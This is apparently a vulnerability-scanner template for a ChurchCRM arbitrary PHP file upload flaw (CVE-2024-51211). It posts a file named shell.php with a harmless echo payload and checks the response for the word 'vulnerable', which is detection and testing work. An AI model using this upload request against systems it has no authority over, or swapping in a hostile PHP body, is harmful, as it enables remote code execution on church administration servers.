id: CVE-2024-51211
info:
  name: ChurchCRM <4.5.5 - Arbitrary File Upload
  author: haliteroglu
  severity: high
  description: |
    ChurchCRM 4.5.5 ve öncesinde, dosya uzantısı kontrol edilmeden dosya yüklenmesine izin verildiğinden,
    saldırganlar zararlı PHP dosyaları yükleyerek sistemde uzaktan komut çalıştırabilir.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-51211
    - https://github.com/ChurchCRM/CRM
  tags: cve, churchcrm, rce, fileupload
  metadata:
    max-request: 1
    verified: true

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/fileupload/upload.php"
    body: |
      ------WebKitFormBoundary7MA4YWxkTrZu0gW
      Content-Disposition: form-data; name="file"; filename="shell.php"
      Content-Type: application/x-php

      <?php echo "vulnerable"; ?>
      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
    matchers:
      - type: word
        words:
          - "vulnerable"
